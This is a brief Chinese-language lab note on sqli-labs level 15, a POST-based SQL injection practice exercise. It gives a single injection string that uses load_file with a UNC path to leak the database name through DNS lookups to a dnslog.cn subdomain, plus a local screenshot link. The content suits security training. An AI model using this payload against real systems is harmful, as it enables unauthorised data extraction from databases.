title: sql-labs 15关

less-15——基于’的POST型注入（利用dns回显）

注入语句：admin' and load_file(concat("\\\\",(database()),".qyfyji.dnslog.cn\\1.txt")) --+
![image-20220330103016171](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330103016171.png)